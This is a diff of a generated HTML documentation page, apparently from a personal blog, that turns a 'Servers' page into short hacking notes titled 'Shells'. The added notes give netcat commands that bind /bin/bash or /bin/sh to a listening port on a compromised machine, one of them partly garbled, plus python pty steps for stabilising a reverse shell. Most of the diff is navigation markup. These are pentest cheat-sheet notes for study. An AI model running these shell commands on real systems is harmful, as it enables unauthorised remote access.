@@ -9,7 +9,7 @@
 
     <link rel="icon" href="/images/favicon.png" type="image/png">
 
-    <title>Servers - Docs</title>
+    <title>Shells - Docs</title>
 
     
     <link href="/css/nucleus.css?1677544343" rel="stylesheet">
@@ -35,7 +35,7 @@
     </style>
     
   </head>
-  <body class="" data-url="/servers/">
+  <body class="" data-url="/hacking/notes/shells/">
     <nav id="sidebar" class="">
 
 
@@ -105,7 +105,7 @@
     
     <li data-nav-id="/servers/" title="Servers" class="dd-item
         
-        active
+        
         
         ">
       <a href="/servers/">
@@ -128,7 +128,7 @@
   
     
     <li data-nav-id="/hacking/" title="Hacking" class="dd-item
-        
+        parent
         
         
         ">
@@ -157,7 +157,7 @@
   
     
     <li data-nav-id="/hacking/notes/" title="Notes" class="dd-item
-        
+        parent
         
         
         ">
@@ -204,7 +204,7 @@
  
   
     
-      <li data-nav-id="/hacking/notes/shells/" title="Shells" class="dd-item ">
+      <li data-nav-id="/hacking/notes/shells/" title="Shells" class="dd-item active">
         <a href="/hacking/notes/shells/">
         Shells
         
@@ -382,7 +382,7 @@
                   
                   
                   <div id="top-github-link">
-                    <a class="github-link" title='Edit this page' href="sasquatchmitch.blogServers/_index.en.md" target="blank">
+                    <a class="github-link" title='Edit this page' href="sasquatchmitch.blogHacking/Notes/shells.md" target="blank">
                       <i class="fas fa-code-branch"></i>
                       <span id="top-github-link-text">Edit this page</span>
                     </a>
@@ -397,6 +397,8 @@
                         </a>
                     </span>
                   
+                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
+                  
                   <span class="links">
                  
                  
@@ -407,7 +409,19 @@
             
           
           
-            <a href='/'>About</a> > Servers
+            
+            
+          
+          
+            
+            
+          
+          
+            <a href='/'>About</a> > <a href='/hacking/'>Hacking</a> > <a href='/hacking/notes/'>Notes</a> > Shells
+          
+        
+          
+        
           
         
           
@@ -416,6 +430,18 @@
                   </span>
                 </div>
                 
+                    <div class="progress">
+    <div class="wrapper">
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#netcat">Netcat</a></li>
+    <li><a href="#stabalize-a-reverse-shell">Stabalize a reverse shell</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+                
               </div>
             </div>
             
@@ -423,28 +449,40 @@
         
         </div>
         
-          <div id="chapter">
-        
         <div id="body-inner">
+          
+            <h1>
+              
+              Shells
+            </h1>
           
 
         
 
 
+<h2 id="netcat">Netcat</h2>
+<ul>
+<li>on compromised machine
+<ul>
+<li>nc -lvnp PORT -e /bin/bash</li>
+<li>If previous doesn&rsquo;t work use:
+<ul>
+<li>mkfifo /tmp/f; nc -lvnp <!-- raw HTML omitted --> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="stabalize-a-reverse-shell">Stabalize a reverse shell</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>;
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm 
+</span></span><span style="display:flex;"><span>Ctrl Z <span style="color:#f92672">+</span> stty raw <span style="color:#f92672">-</span>echo; fg
+</span></span></code></pre></div>
 
-	<h1 id="servers">Servers</h1>
-<p>Discover what this Hugo theme is all about and the core-concepts behind it.</p>
-
-
-
-
-
-<footer class=" footline" >
+<footer class="footline">
 	
 </footer>
 
-        
-            </div> 
         
         </div>
         
@@ -495,6 +533,71 @@
             
                 
                     
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
                     
                 
                 
@@ -514,66 +617,6 @@
                     
                         
                         
-                    
-                
-                
-
-                    
-                    
-                        
-                    
-                    
-
-                    
-                        
-            
-            
-                
-                    
-                
-                
-
-                    
-                    
-                    
-
-                    
-                        
-            
-            
-                
-                    
-                
-                
-
-                    
-                    
-                    
-
-                    
-            
-        
-                    
-                        
-            
-            
-                
-                    
-                
-                
-
-                    
-                    
-                    
-
-                    
-            
-        
-                    
-                        
-            
-            
-                
                     
                 
                 
@@ -649,10 +692,10 @@
 	 
 	 
 		
-			<a class="nav nav-prev" href="/networking/" title="Networking"> <i class="fa fa-chevron-left"></i></a>
+			<a class="nav nav-prev" href="/hacking/notes/privesc/" title="Privesc"> <i class="fa fa-chevron-left"></i></a>
 		
 		
-			<a class="nav nav-next" href="/hacking/" title="Hacking" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
+			<a class="nav nav-next" href="/hacking/notes/tunnelling/" title="Tunnelling" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
 		
 	
     </div>
@@ -684,3 +727,4 @@
 
   </body>
 </html>
+
